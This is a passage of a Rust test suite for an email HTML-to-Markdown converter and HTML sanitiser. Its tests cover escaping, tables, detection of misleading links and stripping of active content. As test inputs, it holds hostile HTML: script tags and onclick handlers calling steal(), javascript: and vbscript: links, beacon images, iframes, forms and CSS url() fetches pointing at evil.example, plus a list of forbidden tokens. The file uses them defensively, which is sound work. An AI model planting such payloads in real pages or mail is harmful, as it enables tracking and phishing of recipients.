        assert_eq!(md(r#"<a href="vbscript:bad()">words</a>"#), "words");
    }

    /// Text the sender wrote is text, not formatting. A price list must not come out in italics.
    #[test]
    fn markdown_characters_in_the_text_are_escaped_rather_than_obeyed() {
        assert_eq!(md("<p>2 * 3 * 4 and _under_ and `tick`</p>"), r"2 \* 3 \* 4 and \_under\_ and \`tick\`");
        assert_eq!(md("<p>&lt;script&gt;</p>"), r"\<script\>");
    }

    #[test]
    fn entities_become_the_characters_they_name() {
        assert_eq!(md("<p>Caf&eacute;</p>"), "Caf&eacute;", "an entity we do not know keeps its spelling");
        assert_eq!(md("<p>a &amp; b &mdash; c&hellip;</p>"), "a & b — c…");
        assert_eq!(md("<p>&#65;&#x42;</p>"), "AB");
        assert_eq!(md("<p>Tom &amp Jerry</p>"), "Tom &amp Jerry", "a bare ampersand is a character");
    }

    /// Newsletters are nested layout tables. A Markdown grid of them is unreadable; the words are
    /// not.
    #[test]
    fn a_layout_table_becomes_its_contents_and_a_data_table_stays_a_table() {
        let layout = "<table><tr><td><p>Left column</p></td><td><p>Right column</p></td></tr></table>";
        assert_eq!(md(layout), "Left column\n\nRight column");

        let data = "<table><tr><th>Item</th><th>Cost</th></tr><tr><td>Tea</td><td>3</td></tr></table>";
        assert_eq!(md(data), "| Item | Cost |\n| --- | --- |\n| Tea | 3 |");
    }

    #[test]
    fn a_quote_nests_and_a_list_indents() {
        // The separating line carries the quote it is inside, which at depth two is `> >`.
        assert_eq!(
            md("<blockquote><p>said</p><blockquote><p>earlier</p></blockquote></blockquote>"),
            "> said\n> >\n> > earlier"
        );
        assert_eq!(md("<ol start=3><li>three</li><li>four</li></ol>"), "3. three\n4. four");
        assert_eq!(md("<ul><li>outer<ul><li>inner</li></ul></li></ul>"), "- outer\n  - inner");
    }

    /// Mail HTML is written by machines that never close anything.
    #[test]
    fn unclosed_and_crossed_tags_do_not_lose_the_text() {
        assert_eq!(md("<p>one<p>two<p>three"), "one\n\ntwo\n\nthree");
        assert_eq!(md("<ul><li>a<li>b<li>c</ul>"), "- a\n- b\n- c");
        assert_eq!(md("<b>bold <i>both</b> italic</i>"), "**bold *both*** italic");
        assert_eq!(md("<p>unterminated tag <br"), "unterminated tag");
    }

    #[test]
    fn a_line_break_survives_as_a_line_break_and_whitespace_collapses() {
        assert_eq!(md("<p>one<br>two</p>"), "one\\\ntwo");
        assert_eq!(md("<p>   lots\n\n   of     space   </p>"), "lots of space");
        assert_eq!(md("<pre>  keep\n   this</pre>"), "```\n  keep\n   this\n```");
    }

    #[test]
    fn an_image_becomes_its_alt_text_and_never_a_url() {
        let converted = to_markdown(r#"<img src="https://cdn.example/cat.png" alt="a cat">"#);
        assert_eq!(converted.markdown, "*[image: a cat]*");
        assert!(!converted.markdown.contains("cdn.example"));
        assert_eq!(converted.images, ["https://cdn.example/cat.png"]);
        assert_eq!(converted.trackers, 0, "it has something to say, so it is not a beacon");
    }

    /// The check that needs nobody's word for it: the words and the destination disagree.
    #[test]
    fn a_link_whose_words_name_another_site_is_reported() {
        let converted = to_markdown(r#"<a href="https://evil.example/go">bank.example</a>"#);
        assert_eq!(
            converted.misleading,
            [Misleading { shown: "bank.example".into(), actual: "https://evil.example/go".into() }]
        );
        // A subdomain of the same place is not a lie...
        let honest = to_markdown(r#"<a href="https://secure.bank.example/login">bank.example</a>"#);
        assert_eq!(honest.misleading, []);
        // ...and neither is a link whose words are words.
        let words = to_markdown(r#"<a href="https://evil.example/go">click here</a>"#);
        assert_eq!(words.misleading, []);
        // A sentence with a full stop in it is not a host.
        let sentence = to_markdown(r#"<a href="https://evil.example/go">Read.this</a>"#);
        assert_eq!(sentence.misleading, [], "`.this` is not a top-level domain");
    }

    #[test]
    fn a_url_is_reduced_to_the_host_that_will_actually_be_reached() {
        assert_eq!(host_of("https://user:pw@bank.example.evil.ru:8443/login?x=1#a"), "bank.example.evil.ru");
        assert_eq!(host_of("bank.example"), "bank.example");
        assert_eq!(host_of("mailto:a@b.example"), "b.example");
        assert!(same_site("secure.bank.example", "bank.example"));
        assert!(!same_site("bank.example", "bank.example.evil.ru"));
    }

    #[test]
    fn a_comment_and_a_doctype_are_not_content() {
        assert_eq!(md("<!doctype html><!-- hidden --><p>shown</p><!-- <p>also hidden</p> -->"), "shown");
        // A comment that never ends takes the rest of the document with it, which is what a
        // browser does too.
        assert_eq!(md("<p>before</p><!-- and then nothing"), "before");
    }

    #[test]
    fn an_empty_document_is_an_empty_document() {
        assert_eq!(md(""), "");
        assert_eq!(md("<html><body></body></html>"), "");
        assert_eq!(md("   \n  "), "");
    }

    // ── restrict: the same allowlist, written back as HTML ──────────────────────

    #[test]
    fn restricted_html_keeps_the_letter_and_nothing_that_executes_or_fetches() {
        let hostile = concat!(
            "<html><head><script>steal()</script></head><body>",
            "<p onclick=\"steal()\" style=\"color:red;background:url(https://evil.example/px)\">safe words</p>",
            "<img src=\"https://evil.example/beacon.gif\" alt=\"a cat\" width=\"1\">",
            "<a href=\"javascript:alert(1)\">click me</a> <a href=\"https://ok.example/\" target=\"_blank\">fine</a>",
            "<iframe src=\"https://evil.example/\"></iframe><form action=\"https://evil.example/\"><input name=\"x\"></form>",
            "</body></html>"
        );
        let out = restrict(hostile);
        for forbidden in
            ["evil.example", "script", "onclick", "src=", "iframe", "javascript", "url(", "target=", "input", "action="]
        {
            assert!(!out.contains(forbidden), "{forbidden} survived:\n{out}");
        }
        assert!(out.contains("<p style=\"color:red;background:none\">safe words</p>"), "{out}");
        assert!(out.contains("<img alt=\"a cat\" width=\"1\">"), "{out}");
        assert!(out.contains("click me"), "the words stay when the link goes");
        assert!(out.contains("<a href=\"https://ok.example/\">fine</a>"), "{out}");
    }

    #[test]
    fn a_stylesheet_survives_with_its_fetches_taken_out() {
        let html = "<style>@import url(https://evil.example/x.css); p { background: url('https://evil.example/bg') } b { color: #333 }</style><p>x</p>";
        let out = restrict(html);
        assert!(!out.contains("evil.example"), "{out}");
        assert!(out.contains("b { color: #333 }"), "the rest of the sheet is intact: {out}");
        assert!(out.contains("p { background: none }"), "{out}");
        assert_eq!(scrub_css("width: expression(alert(1)); color: red"), "width: ; color: red");
    }

    #[test]
    fn a_plain_document_comes_back_as_itself_and_a_nul_does_not_come_back_at_all() {
        assert_eq!(restrict("<p>marketing</p>"), "<p>marketing</p>");
        assert_eq!(restrict("<p>a &amp; b &lt; c</p><br>"), "<p>a &amp; b &lt; c</p><br>");
        assert_eq!(restrict("<p>be\0fore</p>"), "<p>before</p>");
        assert_eq!(restrict(r#"<td colspan="2" title="a > b">x</td>"#), r#"<td colspan="2" title="a &gt; b">x</td>"#);
    }

    /// An attribute value may hold anything, including the character that ends a tag.
    #[test]
    fn a_quoted_attribute_may_contain_the_end_of_its_own_tag() {
        assert_eq!(
            md(r#"<a href="https://e.example/?a=1&amp;b=2" title="a > b">x</a>"#),
            "[x](https://e.example/?a=1&b=2)"
        );
    }
}
